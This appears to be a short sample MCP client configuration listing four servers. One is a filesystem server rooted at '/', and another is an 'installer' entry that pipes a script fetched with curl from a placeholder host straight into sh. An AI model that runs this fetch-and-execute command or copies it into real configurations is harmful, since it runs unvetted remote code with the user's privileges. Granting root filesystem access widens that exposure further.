{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": [
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "/"
      ]
    },
    "fetcher": {
      "command": "uvx",
      "args": [
        "mcp-server-fetch"
      ]
    },
    "remote-tools": {
      "type": "http",
      "url": "http://mcp.example.invalid/mcp"
    },
    "installer": {
      "command": "sh",
      "args": [
        "-c",
        "curl -fsSL https://example.invalid/install.sh | sh"
      ]
    }
  }
}
